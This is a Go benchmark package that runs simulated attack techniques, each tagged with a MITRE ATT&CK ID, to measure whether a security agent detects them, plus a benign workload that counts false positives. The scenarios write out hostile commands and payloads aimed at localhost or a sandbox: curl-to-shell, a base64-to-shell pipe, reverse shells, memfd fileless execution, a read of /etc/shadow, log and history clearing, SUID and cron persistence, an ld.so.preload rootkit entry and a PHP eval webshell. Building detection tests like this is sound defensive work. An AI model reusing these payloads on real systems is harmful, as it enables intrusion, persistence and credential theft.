// Package bench measures the agent against safe attack simulations.
//
// Every scenario is harmless: network targets are 127.0.0.1 (usually a closed
// port), files are written only inside the benchmark sandbox, and "malware" is
// test content such as the EICAR string. Persistence locations are emulated by
// sandbox directories carrying the same tags the agent uses for the real ones.
package bench

import (
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/unix"
)

// Scenario is one simulated technique.
type Scenario struct {
	Name      string
	Technique string // MITRE ATT&CK ID
	Tactic    string
	// Expect lists rule IDs or "sig:<signature name>"; any one counts as detected.
	Expect []string
	Run    func(s *Sandbox) error
}

// Sandbox is the scratch area scenarios work in.
type Sandbox struct {
	Root string
}

// Dir returns a path inside the sandbox.
func (s *Sandbox) Dir(parts ...string) string {
	return filepath.Join(append([]string{s.Root}, parts...)...)
}

func sh(script string) error {
	cmd := exec.Command("/bin/sh", "-c", script)
	cmd.Stdout, cmd.Stderr = io.Discard, io.Discard
	return runTimeout(cmd, 10*time.Second)
}

func runTimeout(cmd *exec.Cmd, d time.Duration) error {
	if err := cmd.Start(); err != nil {
		return err
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()
	select {
	case <-done:
		return nil // scenarios are expected to "fail" (closed ports etc.)
	case <-time.After(d):
		cmd.Process.Kill()
		return fmt.Errorf("timed out after %s", d)
	}
}

// eicar is assembled at runtime so the benchmark binary is not itself a test file.
func eicar() []byte {
	b, _ := hex.DecodeString("58354f2150254041505b345c505a58353428505e2937434329377d24" +
		"45494341522d5354414e444152442d414e544956495255532d544553542d46494c45" + "2124482b482a")
	return b
}

func copyFile(src, dst string, mode os.FileMode) error {
	b, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, b, mode)
}

// Scenarios returns the built-in scenario list.
func Scenarios() []Scenario {
	return []Scenario{
		{
			Name: "download-piped-to-shell", Technique: "T1059.004", Tactic: "execution",
			Expect: []string{"SBS-PROC-001"},
			Run: func(*Sandbox) error {
				return sh("curl -fsS --max-time 1 http://127.0.0.1:9/install.sh | sh; sleep 0.5")
			},
		},
		{
			Name: "base64-payload-to-shell", Technique: "T1140", Tactic: "defense-evasion",
			Expect: []string{"SBS-PROC-002"},
			Run: func(*Sandbox) error {
				return sh("echo ZWNobyBzYnMtYmVuY2g= | base64 -d | sh; sleep 0.5")
			},
		},
		{
			Name: "reverse-shell-tcp-socket", Technique: "T1059.004", Tactic: "command-and-control",
			Expect: []string{"SBS-PROC-003"},
			Run:    reverseShell,
		},
		{
			Name: "reverse-shell-dev-tcp", Technique: "T1059.004", Tactic: "command-and-control",
			Expect: []string{"SBS-PROC-004"},
			Run: func(*Sandbox) error {
				return sh(`bash -c 'exec 3<>/dev/tcp/127.0.0.1/9' 2>/dev/null; sleep 0.5`)
			},
		},
		{
			Name: "exec-from-tmp", Technique: "T1204.002", Tactic: "execution",
			Expect: []string{"SBS-PROC-005"},
			Run: func(s *Sandbox) error {
				p := s.Dir("drop", ".x-update")
				if err := copyFile("/bin/sleep", p, 0o755); err != nil {
					return err
				}
				return runTimeout(exec.Command(p, "0.5"), 5*time.Second)
			},
		},
		{
			Name: "fileless-memfd-exec", Technique: "T1620", Tactic: "defense-evasion",
			Expect: []string{"SBS-PROC-006"},
			Run:    memfdExec,
		},
		{
			Name: "shadow-file-access", Technique: "T1003.008", Tactic: "credential-access",
			Expect: []string{"SBS-PROC-007"},
			Run: func(*Sandbox) error {
				return sh("cat /etc/shadow > /dev/null 2>&1; sleep 0.5")
			},
		},
		{
			Name: "history-clearing", Technique: "T1070.003", Tactic: "defense-evasion",
			Expect: []string{"SBS-PROC-008"},
			Run: func(*Sandbox) error {
				return sh("unset HISTFILE; history -c 2>/dev/null; sleep 0.5")
			},
		},
		{
			Name: "log-deletion", Technique: "T1070.002", Tactic: "defense-evasion",
			Expect: []string{"SBS-PROC-013"},
			Run: func(*Sandbox) error {
				return sh("rm -f /var/log/sbs-bench-does-not-exist.log; sleep 0.5")
			},
		},
		{
			Name: "suid-backdoor", Technique: "T1548.001", Tactic: "privilege-escalation",
			Expect: []string{"SBS-PROC-009", "SBS-FILE-006"},
			Run: func(s *Sandbox) error {
				p := s.Dir("drop", "rootme")
				if err := os.WriteFile(p, []byte("#!/bin/sh\n"), 0o644); err != nil {
					return err
				}
				return runTimeout(exec.Command("chmod", "u+s", p), 5*time.Second)
			},
		},
		{
			Name: "miner-command-line", Technique: "T1496", Tactic: "impact",
			Expect: []string{"SBS-PROC-010"},
			Run: func(*Sandbox) error {
				return sh(": -o stratum+tcp://127.0.0.1:3333 --donate-level 1; sleep 0.5")
			},
		},
		{
			Name: "cron-persistence", Technique: "T1053.003", Tactic: "persistence",
			Expect: []string{"SBS-FILE-001"},
			Run: func(s *Sandbox) error {
				return os.WriteFile(s.Dir("cron", "sbs-update"), []byte("* * * * * root /tmp/.x-update\n"), 0o644)
			},
		},
		{
			Name: "ssh-authorized-keys", Technique: "T1098.004", Tactic: "persistence",
			Expect: []string{"SBS-FILE-002"},
			Run: func(s *Sandbox) error {
				f, err := os.OpenFile(s.Dir("home", ".ssh", "authorized_keys"), os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
				if err != nil {
					return err
				}
				_, err = f.WriteString("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBenchmarkOnlyNotARealKey attacker@sbs-bench\n")
				f.Close()
				return err
			},
		},
		{
			Name: "ld-preload-rootkit", Technique: "T1574.006", Tactic: "persistence",
			Expect: []string{"SBS-FILE-003"},
			Run: func(s *Sandbox) error {
				return os.WriteFile(s.Dir("etc", "ld.so.preload"), []byte("/usr/lib/libsbs-bench.so\n"), 0o644)
			},
		},
		{
			Name: "eicar-test-file", Technique: "T1204", Tactic: "execution",
			Expect: []string{"sig:EICAR-Test-File"},
			Run: func(s *Sandbox) error {
				return os.WriteFile(s.Dir("drop", "invoice.pdf.com"), eicar(), 0o644)
			},
		},
		{
			Name: "miner-config-drop", Technique: "T1496", Tactic: "impact",
			Expect: []string{"sig:Linux.CoinMiner.Generic"},
			Run: func(s *Sandbox) error {
				cfg := `{"autosave":true,"pools":[{"url":"stratum+tcp://127.0.0.1:3333","user":"bench"}],"donate-level":1,"randomx":{"mode":"auto"}}` + "\n"
				return os.WriteFile(s.Dir("drop", "config.json"), []byte(cfg), 0o644)
			},
		},
		{
			Name: "php-webshell-drop", Technique: "T1505.003", Tactic: "persistence",
			Expect: []string{"sig:Webshell.PHP.Generic"},
			Run: func(s *Sandbox) error {
				return os.WriteFile(s.Dir("drop", "status.php"), []byte("<?php @eval($_POST['c']); ?>\n"), 0o644)
			},
		},
	}
}

// reverseShell connects /bin/sh -i to a TCP connection the benchmark itself
// controls, sends it two harmless commands and closes it.
func reverseShell(*Sandbox) error {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return err
	}
	defer ln.Close()
	accepted := make(chan net.Conn, 1)
	go func() {
		c, err := ln.Accept()
		if err == nil {
			accepted <- c
		}
	}()
	conn, err := net.Dial("tcp", ln.Addr().String())
	if err != nil {
		return err
	}
	f, err := conn.(*net.TCPConn).File()
	conn.Close()
	if err != nil {
		return err
	}
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = f, f, f
	err = cmd.Start()
	f.Close() // the shell holds the only copy now, so the socket closes when it exits
	if err != nil {
		return err
	}
	var srv net.Conn
	select {
	case srv = <-accepted:
	case <-time.After(5 * time.Second):
		cmd.Process.Kill()
		return fmt.Errorf("listener never accepted")
	}
	defer srv.Close()
	srv.SetDeadline(time.Now().Add(5 * time.Second))
	srv.Write([]byte("id >/dev/null; sleep 0.5; exit\n"))
	io.Copy(io.Discard, srv)
	return runWait(cmd, 5*time.Second)
}

func runWait(cmd *exec.Cmd, d time.Duration) error {
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()
	select {
	case <-done:
		return nil
	case <-time.After(d):
		cmd.Process.Kill()
		return fmt.Errorf("timed out after %s", d)
	}
}

// memfdExec copies /bin/sleep into an anonymous memfd and executes it, the
// way fileless loaders run payloads that never touch disk.
func memfdExec(*Sandbox) error {
	fd, err := unix.MemfdCreate("sbs-bench", 0)
	if err != nil {
		return fmt.Errorf("memfd_create: %w", err)
	}
	f := os.NewFile(uintptr(fd), "memfd")
	defer f.Close()
	b, err := os.ReadFile("/bin/sleep")
	if err != nil {
		return err
	}
	if _, err := f.Write(b); err != nil {
		return err
	}
	path := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)
	cmd := exec.Command(path, "0.5")
	cmd.Args[0] = "kworker"
	return runTimeout(cmd, 5*time.Second)
}

// Benign is a normal admin/developer workload; any alert during it is a false positive.
// It returns the number of commands run.
func Benign(s *Sandbox) (int, error) {
	cmds := []string{
		"ls -la /usr/bin > /dev/null",
		"cat /etc/os-release > /dev/null",
		"sha256sum /etc/hostname /etc/passwd > /dev/null",
		"grep -c root /etc/passwd > /dev/null",
		"echo hello | tr a-z A-Z > /dev/null",
		"curl --version > /dev/null",
		"base64 /etc/hostname | base64 -d > /dev/null",
		"find /etc -maxdepth 1 -name '*.conf' > /dev/null",
		"uname -a > /dev/null; date > /dev/null; id > /dev/null",
		"ps aux > /dev/null",
		"tar czf " + s.Dir("drop", "backup.tgz") + " /etc/hostname 2>/dev/null",
		"mkdir -p " + s.Dir("drop", "build") + " && echo 'int main(){}' > " + s.Dir("drop", "build", "main.c"),
		"chmod 644 " + s.Dir("drop", "backup.tgz"),
		"rm -rf " + s.Dir("drop", "build"),
		"sleep 0.2",
	}
	n := 0
	for i := 0; i < 3; i++ {
		for _, c := range cmds {
			if err := sh(c); err != nil {
				return n, err
			}
			n++
		}
		if err := os.WriteFile(s.Dir("drop", fmt.Sprintf("report-%d.txt", i)), []byte("quarterly numbers\n"), 0o644); err != nil {
			return n, err
		}
	}
	return n, nil
}
